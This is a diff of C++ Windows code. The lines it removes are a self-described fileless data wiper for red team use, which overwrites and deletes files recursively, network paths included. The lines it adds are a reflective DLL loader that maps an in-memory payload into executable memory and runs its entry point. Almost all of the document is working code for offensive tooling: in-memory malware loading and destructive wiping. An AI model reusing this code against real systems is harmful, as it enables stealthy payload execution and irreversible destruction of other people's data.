@@ -1,210 +1,98 @@
+#include "pch.h"
+#include <iostream>
+#include <Windows.h>
 
-// Fully fileless secure data wiper with manual DLL reflective loader internals (red team use only)
+typedef struct BASE_RELOCATION_BLOCK {
+	DWORD PageAddress;
+	DWORD BlockSize;
+} BASE_RELOCATION_BLOCK, *PBASE_RELOCATION_BLOCK;
 
-#include <windows.h>
-#include <shlwapi.h>
-#include <string>
-#include <filesystem>
-#include <memory>
+typedef struct BASE_RELOCATION_ENTRY {
+	USHORT Offset : 12;
+	USHORT Type : 4;
+} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;
 
-#pragma comment(lib, "Shlwapi.lib")
+using DLLEntry = BOOL(WINAPI *)(HINSTANCE dll, DWORD reason, LPVOID reserved);
 
-// ---------------- Reflective Loader Helpers ----------------
+// EXAMPLE ONLY: Replace with your actual in-memory payload or fetch method.
+extern "C" unsigned char dllPayload[]; // Define this elsewhere
+extern "C" size_t dllPayloadSize;
 
-bool PerformBaseRelocations(BYTE* baseAddress, SIZE_T delta) {
-    if (delta == 0) return true;
+int main()
+{
+	LPVOID dllBytes = dllPayload;  // already in memory
+	DWORD64 dllSize = dllPayloadSize;
 
-    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)baseAddress;
-    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)(baseAddress + dosHeader->e_lfanew);
+	// Parse headers
+	PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)dllBytes;
+	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)dllBytes + dosHeaders->e_lfanew);
+	SIZE_T dllImageSize = ntHeaders->OptionalHeader.SizeOfImage;
 
-    auto& dir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
-    if (dir.Size == 0) return true;
+	// Allocate space for DLL image
+	LPVOID dllBase = VirtualAlloc((LPVOID)ntHeaders->OptionalHeader.ImageBase, dllImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	DWORD_PTR deltaImageBase = (DWORD_PTR)dllBase - (DWORD_PTR)ntHeaders->OptionalHeader.ImageBase;
 
-    PIMAGE_BASE_RELOCATION relocation = (PIMAGE_BASE_RELOCATION)(baseAddress + dir.VirtualAddress);
-    SIZE_T maxSize = dir.Size;
-    SIZE_T processed = 0;
+	// Copy headers
+	std::memcpy(dllBase, dllBytes, ntHeaders->OptionalHeader.SizeOfHeaders);
 
-    while (processed < maxSize && relocation->SizeOfBlock) {
-        DWORD count = (relocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
-        WORD* list = (WORD*)(relocation + 1);
+	// Copy sections
+	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
+	for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
+		LPVOID dest = (LPVOID)((DWORD_PTR)dllBase + section->VirtualAddress);
+		LPVOID src = (LPVOID)((DWORD_PTR)dllBytes + section->PointerToRawData);
+		std::memcpy(dest, src, section->SizeOfRawData);
+		section++;
+	}
 
-        for (DWORD i = 0; i < count; i++) {
-            WORD typeOffset = list[i];
-            WORD type = (typeOffset >> 12) & 0xF;
-            WORD offset = typeOffset & 0xFFF;
+	// Relocations
+	IMAGE_DATA_DIRECTORY relocDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+	DWORD_PTR relocationTable = relocDir.VirtualAddress + (DWORD_PTR)dllBase;
+	DWORD relocProcessed = 0;
 
-            if (type == IMAGE_REL_BASED_DIR64) {
-                UINT64* patchAddr = (UINT64*)(baseAddress + relocation->VirtualAddress + offset);
-                *patchAddr += delta;
-            } else if (type == IMAGE_REL_BASED_HIGHLOW) {
-                DWORD* patchAddr = (DWORD*)(baseAddress + relocation->VirtualAddress + offset);
-                *patchAddr += (DWORD)delta;
-            }
-        }
+	while (relocProcessed < relocDir.Size) {
+		PBASE_RELOCATION_BLOCK relocBlock = (PBASE_RELOCATION_BLOCK)(relocationTable + relocProcessed);
+		relocProcessed += sizeof(BASE_RELOCATION_BLOCK);
+		DWORD relocCount = (relocBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
+		PBASE_RELOCATION_ENTRY relocEntries = (PBASE_RELOCATION_ENTRY)(relocationTable + relocProcessed);
 
-        processed += relocation->SizeOfBlock;
-        relocation = (PIMAGE_BASE_RELOCATION)((BYTE*)relocation + relocation->SizeOfBlock);
-    }
-    return true;
-}
+		for (DWORD i = 0; i < relocCount; i++) {
+			relocProcessed += sizeof(BASE_RELOCATION_ENTRY);
+			if (relocEntries[i].Type == 0) continue;
 
-bool ResolveImports(BYTE* baseAddress) {
-    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)baseAddress;
-    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)(baseAddress + dosHeader->e_lfanew);
+			DWORD_PTR patchAddr = (DWORD_PTR)dllBase + relocBlock->PageAddress + relocEntries[i].Offset;
+			DWORD_PTR patchedVal = 0;
+			std::memcpy(&patchedVal, (PVOID)patchAddr, sizeof(DWORD_PTR));
+			patchedVal += deltaImageBase;
+			std::memcpy((PVOID)patchAddr, &patchedVal, sizeof(DWORD_PTR));
+		}
+	}
 
-    auto& dir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
-    if (dir.Size == 0) return true;
+	// Resolve imports
+	PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)(ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress + (DWORD_PTR)dllBase);
 
-    PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)(baseAddress + dir.VirtualAddress);
+	while (importDesc->Name) {
+		LPCSTR libName = (LPCSTR)((DWORD_PTR)dllBase + importDesc->Name);
+		HMODULE lib = LoadLibraryA(libName);
+		if (!lib) { importDesc++; continue; }
 
-    while (importDesc->Name) {
-        const char* dllName = (const char*)(baseAddress + importDesc->Name);
-        HMODULE moduleHandle = LoadLibraryA(dllName);
-        if (!moduleHandle) return false;
+		PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)dllBase + importDesc->FirstThunk);
+		while (thunk->u1.AddressOfData) {
+			FARPROC fnAddr = nullptr;
+			if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal)) {
+				fnAddr = GetProcAddress(lib, (LPCSTR)IMAGE_ORDINAL(thunk->u1.Ordinal));
+			} else {
+				PIMAGE_IMPORT_BY_NAME import = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)dllBase + thunk->u1.AddressOfData);
+				fnAddr = GetProcAddress(lib, import->Name);
+			}
+			thunk->u1.Function = (DWORD_PTR)fnAddr;
+			++thunk;
+		}
+		importDesc++;
+	}
 
-        PIMAGE_THUNK_DATA64 thunkOrig = (PIMAGE_THUNK_DATA64)(baseAddress + importDesc->OriginalFirstThunk);
-        PIMAGE_THUNK_DATA64 thunkIAT = (PIMAGE_THUNK_DATA64)(baseAddress + importDesc->FirstThunk);
+	// Call entry point
+	DLLEntry DllEntry = (DLLEntry)((DWORD_PTR)dllBase + ntHeaders->OptionalHeader.AddressOfEntryPoint);
+	(*DllEntry)((HINSTANCE)dllBase, DLL_PROCESS_ATTACH, 0);
 
-        if (!thunkOrig) thunkOrig = thunkIAT;
-
-        while (thunkOrig->u1.AddressOfData) {
-            FARPROC funcAddress = NULL;
-
-            if (thunkOrig->u1.Ordinal & IMAGE_ORDINAL_FLAG64) {
-                WORD ordinal = (WORD)(thunkOrig->u1.Ordinal & 0xFFFF);
-                funcAddress = GetProcAddress(moduleHandle, (LPCSTR)ordinal);
-            } else {
-                PIMAGE_IMPORT_BY_NAME importByName = (PIMAGE_IMPORT_BY_NAME)(baseAddress + thunkOrig->u1.AddressOfData);
-                funcAddress = GetProcAddress(moduleHandle, importByName->Name);
-            }
-
-            if (!funcAddress) return false;
-
-            thunkIAT->u1.Function = (ULONGLONG)funcAddress;
-
-            ++thunkOrig;
-            ++thunkIAT;
-        }
-
-        ++importDesc;
-    }
-    return true;
-}
-
-// Reflective loader main function
-extern "C" __declspec(dllexport) BOOL RunReflectivePayload();
-
-// ---------------- Secure Data Wiper (nsfw.dll core) ----------------
-
-// Secure file wipe function
-bool SecureWipeFile(const std::wstring& filePath, int passes) {
-    HANDLE hFile = CreateFileW(filePath.c_str(), GENERIC_WRITE | GENERIC_READ,
-        FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hFile == INVALID_HANDLE_VALUE) return false;
-
-    LARGE_INTEGER fileSize;
-    if (!GetFileSizeEx(hFile, &fileSize) || fileSize.QuadPart == 0) {
-        CloseHandle(hFile);
-        return false;
-    }
-
-    std::unique_ptr<BYTE[]> buffer(new BYTE[(size_t)fileSize.QuadPart]);
-    DWORD written = 0;
-
-    for (int p = 0; p < passes; ++p) {
-        for (LONGLONG i = 0; i < fileSize.QuadPart; ++i)
-            buffer[i] = static_cast<BYTE>(rand() % 256);
-
-        SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
-        WriteFile(hFile, buffer.get(), (DWORD)fileSize.QuadPart, &written, NULL);
-        FlushFileBuffers(hFile);
-    }
-
-    CloseHandle(hFile);
-    return DeleteFileW(filePath.c_str());
-}
-
-// Recursive directory wipe
-void WipeDirectory(const std::wstring& dirPath, int passes) {
-    for (const auto& entry : std::filesystem::recursive_directory_iterator(
-        dirPath, std::filesystem::directory_options::skip_permission_denied)) {
-        if (entry.is_regular_file()) {
-            SecureWipeFile(entry.path().wstring(), passes);
-        }
-    }
-}
-
-bool IsNetworkPath(const std::wstring& path) {
-    return PathIsNetworkPathW(path.c_str());
-}
-
-void SimulateLogEvent(const std::wstring& filePath) {
-    OutputDebugStringW((L"[WIPED] " + filePath + L"\n").c_str());
-}
-
-bool TryMemoryOverwriteFallback(const std::wstring& filePath, int passes) {
-    HANDLE hFile = CreateFileW(filePath.c_str(), GENERIC_READ, FILE_SHARE_READ,
-        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hFile == INVALID_HANDLE_VALUE) return false;
-
-    LARGE_INTEGER fileSize;
-    if (!GetFileSizeEx(hFile, &fileSize)) {
-        CloseHandle(hFile);
-        return false;
-    }
-
-    CloseHandle(hFile);
-    std::unique_ptr<BYTE[]> dummy(new BYTE[(size_t)fileSize.QuadPart]);
-    for (int i = 0; i < passes; ++i)
-        for (LONGLONG j = 0; j < fileSize.QuadPart; ++j)
-            dummy[j] = rand() % 256;
-
-    return true; // Simulated overwrite
-}
-
-bool SecureWipeFileExtended(const std::wstring& filePath, int passes) {
-    if (SecureWipeFile(filePath, passes)) {
-        SimulateLogEvent(filePath);
-        return true;
-    }
-    else {
-        TryMemoryOverwriteFallback(filePath, passes);
-        return false;
-    }
-}
-
-void WipeNetworkPath(const std::wstring& networkPath, int passes) {
-    for (const auto& entry : std::filesystem::recursive_directory_iterator(
-        networkPath, std::filesystem::directory_options::skip_permission_denied)) {
-        if (entry.is_regular_file()) {
-            SecureWipeFileExtended(entry.path().wstring(), passes);
-        }
-    }
-}
-
-// Reflective entry point function
-extern "C" __declspec(dllexport) BOOL RunReflectivePayload() {
-    // Example: wipe "C:\\SensitiveData" recursively with 3 passes (change as needed)
-    const wchar_t* target = L"C:\\SensitiveData";
-    int passes = 3;
-
-    DWORD attr = GetFileAttributesW(target);
-    if (attr == INVALID_FILE_ATTRIBUTES) return FALSE;
-
-    if (IsNetworkPath(target)) {
-        WipeNetworkPath(target, passes);
-    }
-    else if (attr & FILE_ATTRIBUTE_DIRECTORY) {
-        WipeDirectory(target, passes);
-    }
-    else {
-        SecureWipeFileExtended(target, passes);
-    }
-
-    return TRUE;
-}
-
-// Dummy DllMain to satisfy linker
-BOOL APIENTRY DllMain(HMODULE, DWORD, LPVOID) {
-    return TRUE;
+	return 0;
 }
